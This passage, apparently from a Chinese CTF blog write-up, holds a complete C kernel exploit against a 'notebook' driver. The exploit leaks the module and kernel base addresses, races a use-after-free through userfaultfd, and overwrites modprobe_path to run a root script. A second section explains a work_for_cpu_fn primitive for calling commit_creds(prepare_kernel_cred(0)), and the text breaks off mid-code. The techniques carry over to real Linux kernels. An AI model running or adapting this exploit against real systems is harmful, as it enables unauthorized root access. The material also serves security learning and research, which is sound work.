class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_DATA_SIZE 0x1000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsetvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// nameçš„é•¿åº¦</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);<span class=\"comment\">// 0x60 is max size</span></span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_gift(buf);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note[0] addr is 0x%lx&quot;</span>, *(<span class=\"type\">uint64_t</span> *)buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;buf addr is 0x%lx&quot;</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *ptr = (<span class=\"type\">uint64_t</span> *)buf;</span><br><span class=\"line\">\t<span class=\"comment\">// è·å¾—ä¸¤ä¸ªå—åœ¨å †ä¸Šçš„åœ°å€</span></span><br><span class=\"line\">\theap[<span class=\"number\">0</span>] = ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\theap[<span class=\"number\">1</span>] = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;chunk[0] addr is 0x%lx, chunk[1] is 0x%lx&quot;</span>,</span><br><span class=\"line\">\t\theap[<span class=\"number\">0</span>], heap[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"comment\">// é‡Šæ”¾é“¾è¡¨ 0 -&gt; 1 å»è·å–cookie</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t<span class=\"comment\">// pause();</span></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\t<span class=\"comment\">// Info(&quot;chunk[0]&#x27;s content is 0x%lx&quot;, ptr[0]);</span></span><br><span class=\"line\">\t<span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">\t\tnext = selfaddr ^ cookie ^ nextaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcookie = nextaddr ^ next ^ selfaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span> </span><br><span class=\"line\">\tcookie = heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>] ^ ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Cookie is 0x%lx&quot;</span>, cookie); </span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;So in this time next should be 0x%lx&quot;</span>, </span><br><span class=\"line\">\t\tcookie ^ heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>]\t</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/* åˆ°æ­¤ä¸ºæ­¢ ä¿¡æ¯æ”¶é›†åŸºæœ¬å®Œæˆ å¼€å§‹ uffdæ¡ä»¶ç«äº‰æ¥uaf */</span></span><br><span class=\"line\">\tfault_page = (<span class=\"type\">size_t</span>)mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, (<span class=\"type\">char</span> *)fault_page);<span class=\"comment\">// æ­¤æ—¶å¡ä½ è®©å¦å¤–çš„çº¿ç¨‹å»æ‰§è¡Œfree</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Now free_list maybe look like following:&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;&gt;&gt;  Chks-&gt;chunk[1]-&gt;chunk[0]-&gt;target  &lt;&lt;&quot;</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);<span class=\"comment\">// chunk[1] -&gt; chunk[0] -&gt; target</span></span><br><span class=\"line\">\t<span class=\"comment\">// è¿™è¾¹æœ€å¥½ä¸è¦æœ‰ä»»ä½•æ‰“å°æ“ä½œ</span></span><br><span class=\"line\">\t<span class=\"comment\">// è¿™é‡Œè‡³å…³é‡è¦ åœ¨notebookä¸Šé¢ä¼ªé€  cookie ^ selfaddr ä½œä¸ºfd è¡¨ç¤ºè¿™é“¾è¡¨çš„ç»“æŸ</span></span><br><span class=\"line\">\t*(<span class=\"type\">size_t</span> *)(buf + <span class=\"number\">0xF0</span>) = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *buf2 = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10</span> ; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;loop %d&quot;</span>, i);</span><br><span class=\"line\">\t\t_add(i, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\t\t_gift(buf2);</span><br><span class=\"line\">\t\t<span class=\"type\">uint64_t</span> tmp = *(<span class=\"type\">uint64_t</span> *)(buf2 + i * <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(heap[<span class=\"number\">0</span>] == tmp)&#123;</span><br><span class=\"line\">\t\t\tInfo(<span class=\"string\">&quot;Catch it, next is target&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>( i == <span class=\"number\">0xF</span> )&#123;</span><br><span class=\"line\">\t\t\tPanic(<span class=\"string\">&quot;Failure and exit&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;i is %d&quot;</span>, i);</span><br><span class=\"line\">\t<span class=\"comment\">// åŠ«æŒ notebookç»“æ„ä½“</span></span><br><span class=\"line\">\t_add(i + <span class=\"number\">1</span>, <span class=\"number\">0x60</span>, buf);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> PL[] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"comment\">// name field</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x168</span>, <span class=\"number\">0x4</span>,<span class=\"comment\">// æ³„æ¼é‡å®šä½çš„ä½ç½®</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x2500</span>, <span class=\"number\">0x60</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\twrite_to_kernel(i + <span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;offset data is 0x%lx&quot;</span>, *(<span class=\"type\">uint32_t</span> *)ptr);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> leak = mod_base_addr + <span class=\"number\">0x168</span> + <span class=\"number\">4</span> + *(<span class=\"type\">uint32_t</span> *)ptr;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;leak addr is 0x%lx&quot;</span>, <span class=\"number\">0xffffffff00000000</span> | leak);</span><br><span class=\"line\">\t<span class=\"comment\">// kernel ffffffff81000000 0xffffffff81476c30</span></span><br><span class=\"line\">\tkernel_base_addr = ( <span class=\"number\">0xffffffff00000000</span> | leak ) - <span class=\"number\">0x476c30</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\tmodprobe_path = kernel_base_addr + <span class=\"number\">0x125D2E0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPL[<span class=\"number\">0</span>] = modprobe_path;</span><br><span class=\"line\">\tPL[<span class=\"number\">1</span>] = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(buf, <span class=\"string\">&quot;/tmp/exp.sh&quot;</span>);<span class=\"comment\">// è®©modprobeæ‰§è¡Œçš„è„šæœ¬</span></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;#!/bin/sh\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/cp /flag /tmp/flag\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/exp.sh\\n&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/exp.sh&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    system(<span class=\"string\">&quot;/tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tclose(note_fd);</span><br><span class=\"line\">\tclose(uffd);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// æ³¨æ„è¿™é‡Œæ²¡æœ‰-1 pthread createæ­£å¸¸è¿”å›0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;regitser done&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd %d&quot;</span>, uffd);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// put some code you want</span></span><br><span class=\"line\">\t\t_del(<span class=\"number\">0</span>);<span class=\"comment\">// å†™æ²¡åŠ é” æ¡ä»¶ç«äº‰è®©ä»–freeæ‰</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t<span class=\"comment\">// (mod_base_addr + 0x2500) æ˜¯n</span></span><br><span class=\"line\">\t<span class=\"comment\">// ç”±äºæ¡ä»¶ç«äº‰ æ¥ä¸‹æ¥çš„æ•°æ®å†™æ˜¯å†™åˆ°frotebookç»“æ„ä½“æ‰€åœ¨çš„ä½ç½® æˆ‘ä»¬è¦åŠ«æŒè¿‡å» ç¯¡æ”¹æŒ‡é’ˆ</span></span><br><span class=\"line\">\ttarget = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>) ^ heap[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;target addr is 0x%lx&quot;</span>, target);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> s[<span class=\"number\">2</span>] = &#123;target, <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)s;</span><br><span class=\"line\">\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"éƒ½ä»€ä¹ˆç‰ˆæœ¬äº†è¿˜åœ¨ç”¨ä¼ ç»Ÿrop-work_for_cpu_fun\"><a class=\"markdownIt-Anchor\" href=\"#éƒ½ä»€ä¹ˆç‰ˆæœ¬äº†è¿˜åœ¨ç”¨ä¼ ç»Ÿrop-work_for_cpu_fun\">#</a> éƒ½ä»€ä¹ˆç‰ˆæœ¬äº†è¿˜åœ¨ç”¨ä¼ ç»Ÿ ROP - work_for_cpu_fun</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">    <span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">    <span class=\"type\">void</span> *arg;</span><br><span class=\"line\">    <span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">work_for_cpu_fn</span><span class=\"params\">(<span class=\"keyword\">struct</span> work_struct *work)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> *<span class=\"title\">wfc</span> =</span> container_of(work, <span class=\"keyword\">struct</span> work_for_cpu, work);</span><br><span class=\"line\">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„ <code>fake_tty_struct</code>  å‡è£…æˆ <code>work_for_cpu</code></p>\n<p>åŠ«æŒ <code>ops</code>  ä¸º <code>work_for_cpu_fn</code></p>\n<p>è°ƒç”¨ <code>operation</code>  çš„æ—¶å€™æ­£å¥½æŠŠè‡ªå·±ä¼ å…¥è°ƒç”¨ è€Œä¸”éå¸¸éå¸¸å¹²å‡€ ä¸ç¯¡æ”¹ä»»ä½•å…¶ä»–å€¼</p>\n<p>è¿™å°±èƒ½å®ç°ä¸€ä¸ªå•å‚å‡½æ•°è°ƒç”¨çš„åŸè¯­</p>\n<p>ä¸¤æ¬¡åŸè¯­å³å¯ <code>commit_creds(prepare_kernel_cred(0))</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span 